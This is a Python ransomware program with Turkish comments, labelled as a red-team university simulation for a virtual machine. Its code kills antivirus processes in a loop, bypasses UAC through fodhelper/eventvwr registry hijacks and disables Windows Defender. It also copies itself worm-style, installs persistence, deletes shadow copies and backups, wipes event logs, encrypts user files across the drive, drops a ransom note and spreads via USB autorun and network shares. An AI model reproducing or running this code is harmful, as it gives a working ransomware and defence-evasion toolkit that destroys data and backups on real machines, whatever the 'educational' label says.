# super_ransomware_sim.py - EĞİTİM AMAÇLI / SANAL MAKİNE İÇİN
# Çok katmanlı saldırı simülasyonu - Red Team ödevi

import os
import sys
import ctypes
import subprocess
import winreg as reg
import time
import random
import string
import base64
import shutil
import threading
import socket
import urllib.request
import json
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import psutil  # Doğrudan import, try-except gerek yok

# ============================================================
# 0. ANTI-ANALİZ VE BELLEK DURDURMA
# ============================================================

print("[*] Anti-analiz başlatılıyor...")

# VM ve debugger kontrolü
try:
    for proc in psutil.process_iter(['name']):
        if any(x in proc.info['name'].lower() for x in ['vmtools', 'vbox', 'wireshark', 'x64dbg', 'ollydbg']):
            time.sleep(30)
except:
    pass
time.sleep(random.randint(5, 15))

print("[*] Bellekteki güvenlik yazılımları durduruluyor...")

# ============================================================
# 0.1. TASKILL İLE BELLEKTEN DURDURMA
# ============================================================

hedef_surecler = [
    'MsMpEng.exe',      # Windows Defender
    'NisSrv.exe',       # Defender Network
    'SenseCE.exe',      # Defender ATP
    'CSFalconService.exe', # CrowdStrike
    'cb.exe',           # Carbon Black
    'AVP.exe',          # Kaspersky
    'avast.exe',        # Avast
    'avg.exe',          # AVG
    'EKRN.exe',         # ESET
    'Sophos.exe',       # Sophos
    'McAfee.exe',       # McAfee
    'Norton.exe'        # Norton
]

for proc_name in hedef_surecler:
    try:
        subprocess.run(f'taskkill /f /im {proc_name}', shell=True, capture_output=True)
        print(f"[+] {proc_name} durduruldu!")
    except:
        pass

# ============================================================
# 0.2. PSUTIL İLE BELLEKTEN DURDURMA (DAHA GELİŞMİŞ)
# ============================================================

try:
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() in [x.lower() for x in hedef_surecler]:
                proc.kill()
                print(f"[+] {proc.info['name']} psutil ile durduruldu!")
        except:
            pass
except:
    pass

# ============================================================
# 0.3. SONSÜZ DÖNGÜ: YENİ AÇILAN GÜVENLİK YAZILIMLARINI ENGELLE
# ============================================================

def sürekli_durdurucu():
    while True:
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'] and proc.info['name'].lower() in [x.lower() for x in hedef_surecler]:
                        proc.kill()
                        print(f"[!] {proc.info['name']} yeniden açıldı ve DURDURULDU!")
                except:
                    pass
        except:
            pass
        time.sleep(2)

thread = threading.Thread(target=sürekli_durdurucu, daemon=True)
thread.start()

# ============================================================
# 1. YÖNETİCİ YETKİSİ VE UAC BYPASS
# ============================================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def uac_bypass():
    if is_admin():
        return True
    
    # 1. ShellExecuteW
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    except:
        pass
    
    # 2. Fodhelper
    try:
        key_path = r"Software\Classes\ms-settings\shell\open\command"
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, key_path)
        reg.SetValueEx(key, "", 0, reg.REG_SZ, f'"{sys.executable}" {sys.argv[0]}')
        reg.SetValueEx(key, "DelegateExecute", 0, reg.REG_SZ, "")
        reg.CloseKey(key)
        subprocess.Popen("fodhelper.exe", shell=True)
        sys.exit()
    except:
        pass
    
    # 3. Eventvwr
    try:
        key_path = r"Software\Classes\mscfile\shell\open\command"
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, key_path)
        reg.SetValueEx(key, "", 0, reg.REG_SZ, f'"{sys.executable}" {sys.argv[0]}')
        reg.CloseKey(key)
        subprocess.Popen("eventvwr.exe", shell=True)
        sys.exit()
    except:
        pass
    
    return False

uac_bypass()

# ============================================================
# 2. WINDOWS DEFENDER'İ DEVREDIŞI BIRAKMA
# ============================================================

def disable_defender():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        script_dir = os.path.dirname(exe_path)
        subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath \\"{script_dir}\\""', shell=True, capture_output=True)
        subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionProcess \\"{os.path.basename(exe_path)}\\""', shell=True, capture_output=True)
        subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionExtension \\".enc\\""', shell=True, capture_output=True)
        
        commands = [
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "Set-MpPreference -DisableBehaviorMonitoring $true",
            "Set-MpPreference -DisableBlockAtFirstSeen $true",
            "Set-MpPreference -DisableIOAVProtection $true",
            "Set-MpPreference -DisablePrivacyMode $true",
            "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
            "Set-MpPreference -DisableArchiveScanning $true",
            "Set-MpPreference -DisableIntrusionPreventionSystem $true",
            "Set-MpPreference -DisableScriptScanning $true",
            "Set-MpPreference -SubmitSamplesConsent 2"
        ]
        for cmd in commands:
            subprocess.run(f'powershell -Command "{cmd}"', shell=True, capture_output=True)
        
        subprocess.run('net stop WinDefend /y', shell=True, capture_output=True)
        subprocess.run('sc config WinDefend start= disabled', shell=True, capture_output=True)
        
        key_paths = [
            r"SOFTWARE\Policies\Microsoft\Windows Defender",
            r"SOFTWARE\Microsoft\Windows Defender",
            r"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
        ]
        for kp in key_paths:
            try:
                key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, kp)
                reg.SetValueEx(key, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
                reg.SetValueEx(key, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)
                reg.CloseKey(key)
            except:
                pass
                
        try:
            key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender\Signature Updates")
            reg.SetValueEx(key, "ForceUpdateFromMU", 0, reg.REG_DWORD, 0)
            reg.CloseKey(key)
        except:
            pass
    except:
        pass

disable_defender()

# ============================================================
# 3. SAHTE DOSYA OLUŞTURMA (ANTİ-VİRÜSÜ ŞAŞIRTMAK İÇİN)
# ============================================================

def create_decoy_files():
    print("[*] Sahte dosyalar oluşturuluyor (anti-virüs şaşırtma)...")
    
    desktop = os.path.expanduser("~/Desktop")
    documents = os.path.expanduser("~/Documents")
    
    # 1. Masaüstüne 200 sahte .txt dosyası (azaltıldı)
    for i in range(200):
        try:
            rnd_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            file_path = os.path.join(desktop, f"{rnd_name}.txt")
            content = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=random.randint(100, 5000)))
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(content)
            if i % 50 == 0:
                print(f"[*] {i+1} sahte dosya oluşturuldu...")
        except:
            pass
        time.sleep(0.001)
    
    # 2. Sahte .bat dosyaları (20 adet)
    for i in range(20):
        try:
            rnd_name = ''.join(random.choices(string.ascii_letters, k=8))
            bat_path = os.path.join(desktop, f"{rnd_name}.bat")
            with open(bat_path, 'w') as f:
                f.write(f"""@echo off
:: Sahte virüs dosyası - {i}
echo Bu bir sahte dosyadır
copy "%0" "%temp%\\{rnd_name}_copy.bat"
start "" "%temp%\\{rnd_name}_copy.bat"
""")
        except:
            pass
    
    # 3. Sahte .ps1 dosyaları (20 adet)
    for i in range(20):
        try:
            rnd_name = ''.join(random.choices(string.ascii_letters, k=8))
            ps1_path = os.path.join(desktop, f"{rnd_name}.ps1")
            with open(ps1_path, 'w') as f:
                f.write(f"""# Sahte PowerShell dosyası - {i}
Write-Host "Bu sahte bir dosyadır"
$path = $env:TEMP + "\\{rnd_name}_copy.ps1"
Copy-Item $MyInvocation.MyCommand.Path $path
Start-Process powershell -ArgumentList "-File $path"
""")
        except:
            pass
    
    # 4. Belgeler klasörüne 50 dosya
    for i in range(50):
        try:
            rnd_name = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            file_path = os.path.join(documents, f"{rnd_name}.txt")
            content = ''.join(random.choices(string.ascii_letters + string.digits, k=1000))
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(content)
        except:
            pass
    
    print("[+] Sahte dosyalar oluşturuldu!")

threading.Thread(target=create_decoy_files, daemon=True).start()

# ============================================================
# 4. KENDİNİ ÇOĞALTMA (WORM ÖZELLİĞİ)
# ============================================================

def kendini_kopyala():
    print("[*] Kendini çoğaltma başlatıldı...")
    script_path = os.path.abspath(sys.argv[0])
    
    hedef_klasorler = [
        os.environ['TEMP'],
        os.environ['APPDATA'],
        os.environ['USERPROFILE'] + '\\Documents',
        os.environ['USERPROFILE'] + '\\Downloads',
        os.environ['PROGRAMDATA'],
        'C:\\Windows\\Temp'
    ]
    
    sayac = 0
    while True:
        try:
            for folder in hedef_klasorler:
                if os.path.exists(folder):
                    rnd_name = ''.join(random.choices(string.ascii_letters, k=10))
                    dest = os.path.join(folder, f"{rnd_name}.pyw")
                    
                    if not os.path.exists(dest):
                        shutil.copy2(script_path, dest)
                        sayac += 1
                        print(f"[*] {sayac}. kopya oluşturuldu: {dest}")
                        
                        bat_path = os.path.join(folder, f"{rnd_name}.bat")
                        with open(bat_path, 'w') as f:
                            f.write(f'@echo off\n"{sys.executable}" "{dest}"\n')
                        
                        ps1_path = os.path.join(folder, f"{rnd_name}.ps1")
                        with open(ps1_path, 'w') as f:
                            f.write(f'Start-Process "{sys.executable}" -ArgumentList "{dest}"')
            
            time.sleep(10)
        except Exception as e:
            print(f"[-] Kopyalama hatası: {e}")
        time.sleep(5)

threading.Thread(target=kendini_kopyala, daemon=True).start()

# ============================================================
# 5. KALICILIK (PERSISTENCE)
# ============================================================

def add_persistence():
    script_path = os.path.abspath(sys.argv[0])
    
    tasks = [
        ("SystemUpdateTask", "ONLOGON", "0001:00"),
        ("WindowsMaintenance", "DAILY", "00:00"),
        ("MicrosoftEdgeUpdate", "ONSTART", "0001:00")
    ]
    for task_name, trigger, delay in tasks:
        try:
            cmd = f'SCHTASKS /CREATE /TN "{task_name}" /TR "{sys.executable} \\"{script_path}\\"" /SC {trigger} /DELAY {delay} /F'
            subprocess.run(cmd, shell=True, capture_output=True)
        except:
            pass

    run_keys = [
        (reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
    ]
    for hive, subkey in run_keys:
        try:
            key = reg.OpenKey(hive, subkey, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "WindowsSecurityHelper", 0, reg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            reg.CloseKey(key)
        except:
            pass

    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    bat_path = os.path.join(startup, "SystemHelper.bat")
    try:
        with open(bat_path, 'w') as f:
            f.write(f'@echo off\n"{sys.executable}" "{script_path}"\n')
    except:
        pass

add_persistence()

# ============================================================
# 6. SİSTEM GERİ YÜKLEME VE YEDEK YOK ETME
# ============================================================

def delete_restore_and_backups():
    try:
        subprocess.run('vssadmin delete shadows /all /quiet', shell=True, capture_output=True)
        subprocess.run('wmic shadowcopy delete', shell=True, capture_output=True)
        subprocess.run('bcdedit /set {default} recoveryenabled No', shell=True, capture_output=True)
        subprocess.run('bcdedit /set {default} bootstatuspolicy ignoreallfailures', shell=True, capture_output=True)
        
        backup_dirs = [
            os.path.join(os.environ['USERPROFILE'], 'WindowsImageBackup'),
            'C:\\WindowsImageBackup',
            'C:\\Backup',
            'D:\\Backup'
        ]
        for d in backup_dirs:
            if os.path.exists(d):
                shutil.rmtree(d, ignore_errors=True)
    except:
        pass

delete_restore_and_backups()

# ============================================================
# 7. OLAY GÜNLÜKLERİNİ TEMİZLEME
# ============================================================

def clear_logs():
    try:
        subprocess.run('wevtutil cl System', shell=True, capture_output=True)
        subprocess.run('wevtutil cl Application', shell=True, capture_output=True)
        subprocess.run('wevtutil cl Security', shell=True, capture_output=True)
        subprocess.run('wevtutil cl Setup', shell=True, capture_output=True)
        subprocess.run('wevtutil cl Windows PowerShell', shell=True, capture_output=True)
    except:
        pass

clear_logs()

# ============================================================
# 8. ŞİFRELEME MOTORU (Fernet / AES-128-CBC)
# ============================================================

def generate_master_key():
    salt = os.urandom(16)
    password = "RedTeam_Project_2026"
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=200000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    try:
        key_handle = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\RedTeamLab")
        reg.SetValueEx(key_handle, "MasterKey", 0, reg.REG_SZ, key.decode('utf-8'))
        reg.SetValueEx(key_handle, "Salt", 0, reg.REG_SZ, base64.b64encode(salt).decode('utf-8'))
        reg.SetValueEx(key_handle, "PasswordHint", 0, reg.REG_SZ, "RedTeam_Project_2026")
        reg.CloseKey(key_handle)
    except:
        pass
    return key

MASTER_KEY = generate_master_key()
cipher = Fernet(MASTER_KEY)

# Hedef uzantılar
TARGET_EXTS = ('.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', 
               '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd', '.ai', '.eps', 
               '.zip', '.rar', '.7z', '.tar', '.gz', '.py', '.c', '.cpp', '.java', '.cs', 
               '.php', '.js', '.html', '.css', '.sql', '.db', '.sqlite', '.bak', '.backup', 
               '.config', '.ini', '.cfg', '.xml', '.json', '.yml', '.yaml', '.ps1', '.bat', 
               '.cmd', '.vbs', '.lnk')

def encrypt_file(file_path):
    try:
        if os.path.getsize(file_path) > 10 * 1024 * 1024:  # 10MB limit
            return False
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(file_path, 'wb') as f:
            f.write(encrypted)
        os.rename(file_path, file_path + '.enc')
        return True
    except:
        return False

# ============================================================
# 9. SIRALI ŞİFRELEME (ÖNCE DESKTOP, SONRA DOWNLOAD, VS.)
# ============================================================

def sıralı_şifrele():
    print("[*] Sıralı şifreleme başlatılıyor...")
    
    user_profile = os.environ['USERPROFILE']
    
    # Şifreleme sırası (öncelik sırası) - Joker karakterler kaldırıldı
    şifreleme_sırası = [
        os.path.join(user_profile, 'Desktop'),
        os.path.join(user_profile, 'Downloads'),
        os.path.join(user_profile, 'Pictures'),
        os.path.join(user_profile, 'Videos'),
        os.path.join(user_profile, 'Music'),
        os.path.join(user_profile, 'Documents'),
        'C:\\'
    ]
    
    for hedef in şifreleme_sırası:
        if os.path.exists(hedef):
            print(f"[*] Şifreleniyor: {hedef}")
            try:
                for root, dirs, files in os.walk(hedef):
                    # Sistem klasörlerini atla
                    if any(x in root for x in ['Windows', 'System32', 'Microsoft', 'AppData', 'ProgramData', 'Boot']):
                        continue
                    
                    dosya_listesi = []
                    for file in files:
                        if file.endswith('.enc') or file.endswith('.ftw'):
                            continue
                        if file.lower().endswith(TARGET_EXTS):
                            file_path = os.path.join(root, file)
                            try:
                                size = os.path.getsize(file_path)
                                dosya_listesi.append((size, file_path))
                            except:
                                pass
                    
                    dosya_listesi.sort(key=lambda x: x[0])
                    
                    for size, file_path in dosya_listesi:
                        if encrypt_file(file_path):
                            print(f"[+] Şifrelendi: {os.path.basename(file_path)} ({size/1024:.0f}KB)")
                        time.sleep(0.01)
                    
                    time.sleep(0.1)
            except PermissionError:
                print(f"[!] {hedef} altında yetki hatası, atlanıyor...")
                continue
            time.sleep(0.5)

threading.Thread(target=sıralı_şifrele, daemon=True).start()

# ============================================================
# 10. FİDYE NOTU BIRAKMA
# ============================================================

def drop_ransom_note():
    desktop = os.path.expanduser("~/Desktop")
    documents = os.path.expanduser("~/Documents")
    
    note_content = f"""
{'='*70}
                 BİLGİSAYARINIZ RED TEAM TARAFINDAN ELE GEÇİRİLDİ
{'='*70}

Tüm önemli dosyalarınız (belgeler, fotoğraflar, projeler, veritabanları) 
AES-128-CBC (Fernet) algoritması ile şifrelenmiştir.

Dosyalarınızı kurtarmak için gerekli anahtar Windows Kayıt Defteri'nde
saklanmaktadır.

[Blue Team için İPUÇLARI]
- Kayıt Defteri Yolu: HKEY_CURRENT_USER\Software\RedTeamLab
- Anahtar değerleri: 'MasterKey' (base64), 'Salt' (base64), 'PasswordHint' 
- Şifre türetme: PBKDF2HMAC(SHA256, 200000 iterasyon)
- Parola (Password): RedTeam_Project_2026

NOT: Bu bir üniversite ödev simülasyonudur. Gerçek zararlı yazılım değildir.
Lütfen panik yapmayın ve Blue Team ile iletişime geçin.

Red Team - 2026
{'='*70}
"""
    
    for folder in [desktop, documents]:
        if os.path.exists(folder):
            note_path = os.path.join(folder, "!!!DOSYALARINIZ_KILITLENDI!!!.txt")
            try:
                with open(note_path, 'w', encoding='utf-8') as f:
                    f.write(note_content)
            except:
                pass

drop_ransom_note()

# ============================================================
# 11. USB VE AĞ YAYILIMI
# ============================================================

def spread_to_usb():
    try:
        drives = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        for drive in drives:
            if ctypes.windll.kernel32.GetDriveTypeW(drive) == 2:  # DRIVE_REMOVABLE
                script_path = os.path.abspath(sys.argv[0])
                dest = os.path.join(drive, "SystemHelper.pyw")
                shutil.copy2(script_path, dest)
                with open(os.path.join(drive, "autorun.inf"), "w") as f:
                    f.write("[AutoRun]\nopen=SystemHelper.pyw\naction=Open folder\n")
                with open(os.path.join(drive, "OpenMe.bat"), "w") as f:
                    f.write(f'@echo off\n"{sys.executable}" "{dest}"\n')
                break
    except Exception as e:
        print(f"[-] USB yayılım hatası: {e}")

def network_spread():
    try:
        shares = ["\\\\localhost\\C$\\Users\\Public", "\\\\localhost\\C$\\Windows\\Temp"]
        src = os.path.abspath(sys.argv[0])
        for share in shares:
            if os.path.exists(share):
                dest = os.path.join(share, "syshelp.pyw")
                shutil.copy2(src, dest)
    except Exception as e:
        print(f"[-] Ağ yayılım hatası: {e}")

threading.Thread(target=spread_to_usb, daemon=True).start()
threading.Thread(target=network_spread, daemon=True).start()

# ============================================================
# 12. KENDİNİ YENİDEN ÇALIŞTIRMA (DÜZELTİLDİ)
# ============================================================

def keep_alive():
    # Sadece bir kere başlat ve döngüde bekle, yeni proses oluşturma
    while True:
        time.sleep(60)
        # İsteğe bağlı: bir kere daha başlatmak isterseniz aşağıdaki satırı açabilirsiniz
        # subprocess.Popen([sys.executable, os.path.abspath(sys.argv[0])], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

threading.Thread(target=keep_alive, daemon=True).start()

# ============================================================
# 13. ANA PROGRAM
# ============================================================

if __name__ == "__main__":
    print("[*] Red Team Saldırı Vektörü Başlatılıyor...")
    print("[*] Bellek temizleme, sahte dosyalar, çoğaltma ve sıralı şifreleme aktif!")
    print("[*] Blue Team müdahale edene kadar bekleniyor...")
    
    while True:
        time.sleep(30)